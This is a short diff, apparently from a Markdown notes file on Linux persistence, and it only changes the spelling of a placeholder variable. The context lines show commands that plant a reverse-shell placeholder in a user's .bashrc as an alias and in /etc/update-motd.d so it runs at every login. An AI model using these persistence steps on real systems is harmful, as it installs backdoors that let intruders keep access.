@@ -36,7 +36,7 @@ echo "alias PEST='($revershell_goes_here)'" | sudo tee -a /home/$USER/.bashrc
 
 ```bash
 # When anyone logs in 
-echo "$revershell_goes_here" | sudo tee -a /etc/update-motd.d/00-header
+echo "$reversehell_goes_here" | sudo tee -a /etc/update-motd.d/00-header
 ```
 
 
